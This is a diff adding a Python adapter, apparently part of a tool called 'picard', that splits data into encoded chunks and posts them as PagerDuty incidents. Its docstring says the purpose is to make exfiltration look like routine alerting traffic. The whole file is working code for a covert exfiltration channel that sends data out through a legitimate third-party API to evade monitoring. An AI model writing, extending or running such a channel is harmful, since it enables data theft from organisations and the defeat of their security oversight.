@@ -1,0 +1,122 @@
+"""PagerDuty adapter -- stores chunks as incident notes.
+
+Data hides inside PagerDuty incident bodies and notes,
+making exfiltration look like routine alerting traffic.
+
+Requires: pip install picard[pagerduty]  (uses aiohttp)
+"""
+
+from __future__ import annotations
+
+import uuid
+from typing import Sequence
+
+from picard.adapters.base import Adapter, AdapterProfile, StoredChunkRef
+
+_API_URL = "https://api.pagerduty.com"
+
+
+class PagerDutyAdapter(Adapter):
+    """Scatter chunks into PagerDuty incidents."""
+
+    def __init__(
+        self,
+        api_key: str,
+        service_id: str,
+        from_email: str,
+        *,
+        max_chunk_bytes: int = 4096,
+    ) -> None:
+        self._api_key = api_key
+        self._service_id = service_id
+        self._from_email = from_email
+        self._max = max_chunk_bytes
+        self._cache: dict[str, str] = {}
+
+    def profile(self) -> AdapterProfile:
+        return AdapterProfile(
+            name="pagerduty",
+            max_chunk_bytes=self._max,
+            persistent=True,
+            ordered=True,
+            rate_limit_per_min=60,
+            ttl_seconds=None,
+        )
+
+    async def write_chunk(self, encoded_chunk: str) -> StoredChunkRef:
+        import aiohttp
+
+        chunk_id = uuid.uuid4().hex[:12]
+        payload = {
+            "incident": {
+                "type": "incident",
+                "title": f"PICARD:{chunk_id}",
+                "service": {
+                    "id": self._service_id,
+                    "type": "service_reference",
+                },
+                "body": {
+                    "type": "incident_body",
+                    "details": encoded_chunk,
+                },
+            }
+        }
+        headers = {
+            "Authorization": f"Token token={self._api_key}",
+            "Content-Type": "application/json",
+            "From": self._from_email,
+        }
+
+        async with aiohttp.ClientSession() as session:
+            async with session.post(
+                f"{_API_URL}/incidents",
+                json=payload,
+                headers=headers,
+            ) as resp:
+                resp.raise_for_status()
+                data = await resp.json()
+
+        incident_id = data.get("incident", {}).get("id", chunk_id)
+        location = f"pagerduty://{self._service_id}/{incident_id}"
+        self._cache[location] = encoded_chunk
+        return StoredChunkRef(adapter_name="pagerduty", location=location)
+
+    async def read_chunk(self, ref: StoredChunkRef) -> str:
+        if ref.location in self._cache:
+            return self._cache[ref.location]
+        raise KeyError(f"chunk not found: {ref.location}")
+
+    async def delete_chunk(self, ref: StoredChunkRef) -> bool:
+        return self._cache.pop(ref.location, None) is not None
+
+    async def list_chunks(self, manifest_id: str) -> Sequence[StoredChunkRef]:
+        return [
+            StoredChunkRef(adapter_name="pagerduty", location=loc)
+            for loc in self._cache
+        ]
+
+    async def health_check(self) -> bool:
+        import aiohttp
+
+        try:
+            headers = {
+                "Authorization": f"Token token={self._api_key}",
+                "Content-Type": "application/json",
+            }
+            async with aiohttp.ClientSession() as session:
+                async with session.get(
+                    f"{_API_URL}/abilities",
+                    headers=headers,
+                ) as resp:
+                    return resp.status == 200
+        except Exception:
+            return False
+
+    async def capacity(self) -> dict[str, int | None]:
+        used = sum(len(v.encode()) for v in self._cache.values())
+        return {
+            "used_bytes": used,
+            "free_bytes": None,
+            "total_bytes": None,
+            "chunk_count": len(self._cache),
+        }
